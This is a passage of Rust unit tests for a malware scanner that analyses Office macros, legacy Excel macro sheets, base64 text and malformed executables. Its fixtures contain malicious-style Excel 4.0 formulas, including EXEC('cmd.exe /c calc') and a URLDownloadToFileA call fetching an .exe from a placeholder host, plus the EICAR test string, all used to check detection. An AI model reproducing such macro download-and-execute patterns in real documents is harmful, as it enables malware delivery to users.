            r.notes
        );
    }

    #[test]
    fn a_benign_macro_is_not_escalated() {
        use crate::vba::fixtures::{docm, ovba};

        let macro_source = b"Sub Hello()\r\n    MsgBox \"hello\"\r\nEnd Sub\r\n";
        let data = docm(&[("Module1", &ovba(macro_source))]);
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("hello.docm", &data);
        assert_ne!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
        assert!(
            r.notes.iter().any(|n| n.contains("VBA project: 1 module")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn an_xlsm_macro_sheet_is_flagged() {
        use crate::xlm::fixtures::xlsm;

        let xml = br#"<xm:worksheet><xm:sheetData><xm:row><xm:c><xm:f>EXEC("cmd.exe /c calc")</xm:f></xm:c></xm:row><xm:row><xm:c><xm:f>CALL("urlmon","URLDownloadToFileA","http://example.invalid/a.exe")</xm:f></xm:c></xm:row></xm:sheetData></xm:worksheet>"#;
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("invoice.xlsm", &xlsm(xml));
        assert_eq!(r.verdict, Verdict::Malicious, "notes: {:?}", r.notes);
        assert!(
            r.signals.iter().any(|s| s.id == "xlm.macro_sheet"),
            "signals: {:?}",
            r.signals
        );
    }

    #[test]
    fn a_legacy_xls_macro_sheet_is_suspicious() {
        use crate::vba::fixtures::cfb_stream;
        use crate::xlm::fixtures::biff_globals;

        let data = cfb_stream("Workbook", &biff_globals("Macro1", true, true));
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("legacy.xls", &data);
        assert!(
            r.verdict >= Verdict::Suspicious,
            "notes: {:?}",
            r.notes
        );
        assert!(
            r.signals.iter().any(|s| s.id == "xlm.macro_sheet"),
            "signals: {:?}",
            r.signals
        );
    }

    #[test]
    fn a_legacy_xls_exec_formula_is_flagged() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str};
        use crate::vba::fixtures::cfb_stream;
        use crate::xlm::fixtures::biff_workbook;

        let mut rgce = ptg_str("cmd.exe /c calc");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let stream = biff_workbook("Macro1", true, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("legacy.xls", &data);
        assert!(
            r.verdict >= Verdict::Suspicious,
            "verdict: {:?}, notes: {:?}",
            r.verdict,
            r.notes
        );
        assert!(
            r.rules.iter().any(|m| m.name == "Xlm.Exec"),
            "rules: {:?}",
            r.rules
        );
    }

    #[test]
    fn a_biff5_xls_exec_formula_is_flagged() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str_latin1};
        use crate::vba::fixtures::cfb_stream;
        use crate::xlm::fixtures::biff5_workbook;

        let mut rgce = ptg_str_latin1("cmd.exe /c calc");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let stream = biff5_workbook("Macro1", true, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("legacy.xls", &data);
        assert!(
            r.verdict >= Verdict::Suspicious,
            "verdict: {:?}, notes: {:?}",
            r.verdict,
            r.notes
        );
        assert!(
            r.rules.iter().any(|m| m.name == "Xlm.Exec"),
            "rules: {:?}",
            r.rules
        );
    }

    #[test]
    fn a_vba_pcode_cache_is_reported_not_interpreted() {
        use crate::vba::fixtures::{docm, ovba};

        let mut stream = vec![0x41u8; 64];
        stream.extend_from_slice(&ovba(b"Sub Hello()\r\nEnd Sub\r\n"));
        let e = engine_with(core_rules());
        let r = e.analyze_bytes("macro.docm", &docm(&[("Module1", &stream)]));
        assert!(
            r.notes.iter().any(|n| n.contains("p-code")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn unmarked_base64_is_never_decoded() {
        let e = engine_with(eicar_rules());
        let text = format!("payload = {}", b64(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));
        let r = e.analyze_bytes("notes.txt", text.as_bytes());
        assert_ne!(r.verdict, Verdict::Malicious);
    }

    #[test]
    fn truncated_pe_does_not_panic() {
        // Plausible MZ header with a PE signature but a zeroed optional header
        // magic: content detection says PE, the parser must reject it cleanly.
        let mut data = vec![0u8; 0x100];
        data[0] = b'M';
        data[1] = b'Z';
        data[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        data[0x40..0x44].copy_from_slice(b"PE\x00\x00");
        let e = engine_with("");
        let r = e.analyze_bytes("broken.exe", &data);
        assert!(r.pe.is_none());
        assert!(
            r.notes.iter().any(|n| n.contains("PE parsing failed")),
            "notes: {:?}",
            r.notes
        );
    }

    #[test]
    fn random_buffers_never_panic() {
        let e = engine_with("");
        let mut s: u64 = 0x1234_5678_9abc_def0;
        for len in [0usize, 1, 2, 3, 63, 64, 65, 1024, 4096] {
            let mut data = vec![0u8; len];
            for b in data.iter_mut() {
                s ^= s << 13;
                s ^= s >> 7;
                s ^= s << 17;
                *b = (s >> 24) as u8;
            }
            let _ = e.analyze_bytes("fuzz.bin", &data);
        }
        // Adversarial PE-ish headers.
        for pat in [0x4Du8, 0x50, 0x00, 0xFF] {
            let data = vec![pat; 8192];
            let _ = e.analyze_bytes("fuzz.exe", &data);
        }
    }
}
